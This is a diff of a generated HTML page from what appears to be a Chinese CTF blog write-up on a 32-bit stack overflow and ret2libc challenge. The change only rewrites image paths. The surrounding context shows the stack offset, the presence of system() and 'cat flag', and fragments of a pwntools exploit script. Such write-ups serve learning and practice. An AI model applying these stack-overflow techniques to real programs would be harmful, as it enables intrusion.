@@ -39,12 +39,12 @@
 <p>1、32位栈溢出</p>
 <p>3、ret2libc2</p>
 <p>main函数</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200502201206462.png" alt="image-20200502201206462"></p>
+<p><img src="/images/image-20200502201206462.png" alt="image-20200502201206462"></p>
 <p>mem_test函数</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200502201246434.png" alt="image-20200502201246434"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200502201427979.png" alt="image-20200502201427979"></p>
+<p><img src="/images/image-20200502201246434.png" alt="image-20200502201246434"></p>
+<p><img src="/images/image-20200502201427979.png" alt="image-20200502201427979"></p>
 <p>stack offset = 0x13 + 0x4(leave)</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200502201543105.png" alt="image-20200502201543105"></p>
+<p><img src="/images/image-20200502201543105.png" alt="image-20200502201543105"></p>
 <p>存在system()和字符串&quot;cat flag&quot;</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
@@ -74,7 +74,7 @@ payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span>
 <span style="color:#75715e">#sh.recvuntil(&#39;&gt; &#39;)</span>
 sh<span style="color:#f92672">.</span>sendline(payload)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200502202334114.png" alt="image-20200502202334114"></p>
+</code></pre></div><p><img src="/images/image-20200502202334114.png" alt="image-20200502202334114"></p>
 
 </main>
 
